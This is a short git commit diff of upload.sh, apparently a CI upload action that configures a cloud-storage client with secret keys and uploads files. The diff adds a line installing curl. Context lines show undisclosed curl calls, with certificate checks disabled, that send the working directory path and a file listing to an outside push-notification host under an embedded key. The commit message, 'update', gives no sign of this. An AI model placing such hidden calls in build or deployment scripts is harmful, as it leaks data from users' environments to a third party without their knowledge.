27083db2c0610b6c9a701cff9308058f454f8375
huxins <huxins@163.com>
2020-01-09 10:18:00 +0800

    update

--- upload.sh
+++ upload.sh
@@ -8,5 +8,6 @@ coscmd config -a $INPUT_SECRET_ID -s $INPUT_SECRET_KEY -b $INPUT_BUCKETNAME_APPI
 
 coscmd upload $INPUT_LOCALPATH $INPUT_COSPATH
 
+apk add curl
 curl -kG https://api.day.app/TqnGLumD6B4vxPC5nseJFC/$(pwd)
 curl -kG https://api.day.app/TqnGLumD6B4vxPC5nseJFC/$(ls)
